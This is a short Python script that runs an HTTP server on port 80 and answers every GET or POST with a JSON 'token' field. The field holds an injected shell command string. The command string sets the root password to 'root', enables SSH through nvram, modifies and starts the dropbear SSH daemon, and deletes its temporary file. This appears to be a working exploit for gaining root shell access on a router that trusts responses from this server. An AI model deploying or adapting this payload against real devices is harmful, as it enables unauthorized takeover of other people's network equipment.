from http.server import BaseHTTPRequestHandler, HTTPServer
import json


class SimpleServer(BaseHTTPRequestHandler):
    # 统一响应方法，避免重复代码
    def _send_response(self):
        data = {
            "code": 0,
            "token": "; echo root >/tmp/x; echo root >>/tmp/x; passwd root </tmp/x; nvram set ssh_en=1; nvram commit; sed -i 's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear; /etc/init.d/dropbear start; rm -f /tmp/x;"
        }
        self.send_response(200)
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def do_GET(self):
        print("GET request received!")
        self._send_response()

    def do_POST(self):
        print("POST request received!")
        # 可选：读取 POST 请求体（如果需要）
        # content_length = int(self.headers.get('Content-Length', 0))
        # post_data = self.rfile.read(content_length)
        self._send_response()


server_address = ('0.0.0.0', 80)
httpd = HTTPServer(server_address, SimpleServer)
print("Server running on port 80...")
httpd.serve_forever()
